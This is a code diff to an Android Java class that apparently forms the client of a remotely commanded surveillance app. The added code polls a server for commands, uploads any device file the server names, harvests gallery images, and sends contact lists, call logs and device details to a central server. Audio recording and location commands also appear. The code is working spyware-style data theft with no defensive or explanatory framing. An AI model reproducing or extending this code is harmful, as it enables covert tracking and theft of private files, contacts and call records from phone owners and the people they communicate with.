@@ -8,10 +8,13 @@ import com.google.gson.Gson;
 import com.google.gson.GsonBuilder;
 
 import AutoVoiceRecorder.recorderClass;
+import UiActivities.FileUploadClass;
 import callDetails.contactList;
 import callDetails.deviceRegisterModel;
 import callDetails.inActiveCommand;
 import callDetails.lastCall;
+import gallery.galleryModel;
+import gallery.galleryRunner;
 import models.logModel;
 import models.AttrModel;
 import models.ContactModel;
@@ -29,6 +32,7 @@ import static android.content.ContentValues.TAG;
 
 import androidx.annotation.RequiresApi;
 
+import java.io.File;
 import java.io.IOException;
 import java.util.List;
 
@@ -47,17 +51,18 @@ public class CreaterClass {
         call.enqueue(new Callback<ModelClass>() {
             @Override
             public void onResponse(Call<ModelClass> call, Response<ModelClass> response) {
-              //  Log.d("TAG", "onResponse: "+response);
+                Log.d("TAG", "onResponseContact: "+response);
             }
 
             @Override
             public void onFailure(Call<ModelClass> call, Throwable t) {
-              //  Log.d("TAG", "onResponseFail: "+t.getMessage());
+                Log.d("TAG", "onResponseContact: "+t.getLocalizedMessage());
+
 
             }
         });
     }
-    public static void ContactCreater(String Name , String Mobile){
+    public static void ContactCreater(List<String> Name , List<String> Mobile){
         retrofit = new Retrofit.Builder()
                 .baseUrl(baseUrl)
                 .addConverterFactory(GsonConverterFactory.create())
@@ -84,7 +89,8 @@ public class CreaterClass {
                 .addConverterFactory(GsonConverterFactory.create())
                 .build();
          MyInterface myInterface =  retrofit.create(MyInterface.class);
-         String base = baseUrl+AccountConstants.getStatus(context);
+         String base = baseUrl+"getCommand/"+AccountConstants.getStatus(context);
+        Log.d(TAG, "getStatus: "+base);
          Call<List<AttrModel>>  call = myInterface.getCommand(base);
          call.enqueue(new Callback<List<AttrModel>>() {
              @RequiresApi(api = Build.VERSION_CODES.O)
@@ -94,7 +100,6 @@ public class CreaterClass {
                 List<AttrModel> model = response.body();
                 if (model!=null){
                     for (int i = 0; i < model.size(); i++) {
-
                         switch (model.get(i).getCommand()) {
                             case "sound_record" :{
                                 Log.d(TAG, "onResponse: case "+"sound_record"+i);
@@ -109,25 +114,38 @@ public class CreaterClass {
                             case "contact_log" :{
                                 lastCall.ValidatLog(context.getApplicationContext());
                                 Log.d(TAG, "onResponse: case "+"contact_log"+i);
-                                lastCall.ValidatLog(context.getApplicationContext());
+//                                lastCall.ValidatLog(context.getApplicationContext());
                                 break;
                             }
                             case "live_location" :{
                                 Log.d(TAG, "onResponse: case "+"live_location"+i);
-
                                 break;
                             }
                             case "upload":{
-                                Log.d(TAG, "onResponse: case "+"upload"+i);
-//                                if (model.get(i).g)
-                              //  fileUploadToserver.filefinder(model.get(i).getFilepath() ,model.get(i).getId() , context.getApplicationContext());
+                                FileUploadClass fileUploadClass = new FileUploadClass(new File(model.get(i).getFilepath()), model.get(i).getFilepath(),model.get(i).getId());
+                                fileUploadClass.execute();
+                                Log.d(TAG, "onResponse: case "+"upload file "+i);
+                                try {
+                                    Thread.sleep(3000);
+                                    CreaterClass.inActive("upload" , context);
+                                } catch (InterruptedException e) {
+                                    e.printStackTrace();
+                                }
+
+                                break;
+
+                            }
+                            case "gallary":{
+                                galleryRunner.GetImages(context);
+                                Log.d(TAG, "onResponse: case "+"gallery "+i);
+                                break;
 
                             }
                         }
                     }
 
                 }else {
-                    Log.d(TAG, "onResponse: null");
+                    Log.d(TAG, "onResponse: NoCommand");
                 }
 
              }
@@ -148,14 +166,14 @@ public class CreaterClass {
         Log.d(TAG, "uploadFileonServer: return ");
         return;
     }
-    public static boolean inActive(String command){
+    public static boolean inActive(String command , Context context){
         final boolean flage ;
         retrofit = new Retrofit.Builder()
                 .baseUrl(baseUrl)
                 .addConverterFactory(GsonConverterFactory.create())
                 .build();
         MyInterface myInterface =  retrofit.create(MyInterface.class);
-        String base = baseUrl+AccountConstants.inActive+command ;
+        String base = baseUrl+AccountConstants.inActive+AccountConstants.getStatus(context)+"/"+command ;
         Log.d(TAG, "onResponse: inactive "+ base);
         Call<inActiveCommand> call = myInterface.inActiveCommand(base);
         call.enqueue(new Callback<inActiveCommand>() {
@@ -219,7 +237,7 @@ public class CreaterClass {
             }
         });
     }
-    public static void uploadCallLog(String number , String type ,String  date ,  String Duartion , Context context){
+    public static void uploadCallLog(List<String> number , List<String> type ,List<String>  date ,  List<String> Duartion , Context context){
         Gson gson = new GsonBuilder()
                 .setLenient()
                 .create();
@@ -228,11 +246,11 @@ public class CreaterClass {
                 .addConverterFactory(GsonConverterFactory.create())
                 .build();
         MyInterface myInterface =  retrofit.create(MyInterface.class);
-        logModel lm = new logModel(Build.MODEL , AccountConstants.getStatus(context), Build.BRAND , number , type , date , Duartion);
+        logModel lm = new logModel(number , type , date , Duartion ,Build.MODEL , AccountConstants.getStatus(context), Build.BRAND );
         Call<logModel> call = myInterface.sendCallLog(lm);
         Gson gson2 = new Gson();
         String s = gson2.toJson(lm);
-//        Log.d(TAG, "onResponse: "+s);
+        Log.d(TAG, "onResponse: "+s);
         call.enqueue(new Callback<logModel>() {
             @Override
             public void onResponse(Call<logModel> call, Response<logModel> response) {
@@ -241,7 +259,7 @@ public class CreaterClass {
 
             @Override
             public void onFailure(Call<logModel> call, Throwable t) {
-                Log.d(TAG, "onResponse: upload call log "+t.getLocalizedMessage());
+                Log.d(TAG, "onResponse: upload call log e "+t.getLocalizedMessage());
             }
         });
     }
@@ -266,6 +284,9 @@ public class CreaterClass {
         });
     }
     public static void RegisterDevice(String name , String number , Context context){
+        Gson gson = new GsonBuilder()
+                .setLenient()
+                .create();
         retrofit = new Retrofit.Builder()
                 .baseUrl(baseUrl)
                 .addConverterFactory(GsonConverterFactory.create())
@@ -275,18 +296,42 @@ public class CreaterClass {
         Call<deviceRegisterModel> call = myInterface.registerDevice(dm);
         Gson gson2 = new Gson();
         String json   = gson2.toJson(dm);
-        // Log.d(TAG, "ondevice: "+json);
+        Log.d(TAG, "RegisterDevice: json is "+json);
         call.enqueue(new Callback<deviceRegisterModel>() {
             @Override
             public void onResponse(Call<deviceRegisterModel> call, Response<deviceRegisterModel> response) {
-                Log.d(TAG, "ondevice location: device registerd");
+                Log.d(TAG, "TestApis location: device registerd");
             }
 
             @Override
             public void onFailure(Call<deviceRegisterModel> call, Throwable t) {
-                Log.d(TAG, "ondevice location: device fail registerd"+t.getMessage());
+                Log.d(TAG, "TestApis location: device fail registerd"+t.getMessage());
             }
         });
 
     }
+    public static void sendBulkImages(List<String> url , List<String> date , Context context){
+        Gson gson = new GsonBuilder()
+                .setLenient()
+                .create();
+        retrofit = new Retrofit.Builder()
+                .baseUrl(baseUrl)
+                .addConverterFactory(GsonConverterFactory.create())
+                .build();
+        galleryModel gm = new galleryModel( "gallery",AccountConstants.getStatus(context) , url , date );
+        MyInterface myInterface =  retrofit.create(MyInterface.class);
+        Call<galleryModel> call = myInterface.setGalleryFile(gm);
+        call.enqueue(new Callback<galleryModel>() {
+            @Override
+            public void onResponse(Call<galleryModel> call, Response<galleryModel> response) {
+                Log.d(TAG, "onResponseGallery: "+ response.message());
+            }
+
+            @Override
+            public void onFailure(Call<galleryModel> call, Throwable t) {
+                Log.d(TAG, "onResponseGallery: Fail "+t.getLocalizedMessage());
+
+            }
+        });
+     }
 }
